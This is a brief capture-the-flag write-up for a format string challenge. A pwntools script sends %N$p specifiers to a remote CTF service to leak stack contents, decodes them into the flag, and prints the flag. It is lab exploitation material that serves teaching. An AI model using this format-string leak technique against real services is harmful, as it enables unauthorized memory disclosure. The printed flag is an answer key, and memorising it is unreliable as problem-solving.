# Your Input, Your Rules

This is a simple format string vulnerability problem.
We can inject a big enough payload to read the flag from the stack.

```python
#!/bin/python3
from pwn import *

elf=ELF("./pwn-fmt0")
# p=elf.process()
p=remote("ctf.t43.ro",24061)
# gdb.attach(p,gdbscript="b * 0x8049231")
# sleep(1)

p.read()
payload='%p'*50
payload=b''
for i in range(29,50):
    payload+=f'%{i}$p'.encode()
p.sendline(payload)
data=bytes.fromhex(b''.join(p.read()[:-1].split(b'0x')[::-1]).decode())[::-1][3:]
print(data)

p.interactive()
```

flag: `T43CTF{73a6e1e111e2bcd8683bbc678ec934ce4c00d8ee85721a3ccb7bc477c38cd2a6}`